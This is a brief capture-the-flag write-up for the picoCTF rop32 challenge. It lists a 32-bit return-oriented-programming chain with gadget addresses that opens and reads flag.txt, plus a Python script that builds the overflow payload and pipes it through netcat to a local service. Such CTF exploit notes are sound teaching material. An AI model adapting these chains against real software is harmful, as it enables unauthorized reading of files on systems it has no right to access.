# Read file ROP chain
Based on picoCTF rop32

## Building the chain:
```
&read                     <- 0x0806CD80
ret (pppr to clear args)  <- 0x0806CD02
0
buffer                    <- 0x080DA060
9

&open                     <- 0x0806CC60
ret (ppr to clear args)   <- 0x0806CE81
flag.txt
0

&read                     <- 0x0806CD80
ret (pppr to clear args)  <- 0x0806CD02
3                         <- likely fd for new file, 5 for socat
buffer                    <- writable in .data 0x080DA060
256                       <- buffer size we want

write                     <- 0x0806CE50
ret (exit)                <- 0x0804EEC0
1                         <- stdout
buffer                    <- flag file
256                       <- buffer size
```

## Compile:
```s
nasm -f bin -l sh.lst sh.asm
```

## Execution:
Need to allow server buffering between payloads. Send with `(cat payload1;sleep 1;cat payload2) | nc -nv 127.0.0.1 1337`.
```py
shellcode = b"\x80\xcd\x06\x08\x02\xcd\x06\x08\x00\x00\x00\x00\x60\xa0\x0d\x08\x09\x00\x00\x00\x60\xcc\x06\x08\x81\xce\x06\x08\x60\xa0\x0d\x08\x00\x00\x00\x00\x80\xcd\x06\x08\x02\xcd\x06\x08\x03\x00\x00\x00\x60\xa0\x0d\x08\x00\x01\x00\x00\x50\xce\x06\x08\xc0\xee\x04\x08\x01\x00\x00\x00\x60\xa0\x0d\x08\x00\x01\x00\x00"

p1 = open('payload1','wb')
p1.write(b"\x41"*28)
p1.write(shellcode)
p1.write(b"\x0a")
p1.close()

p2 = open('payload2','wb')
p2.write(str.encode("flag.txt") + b"\x00")
p2.close()
```

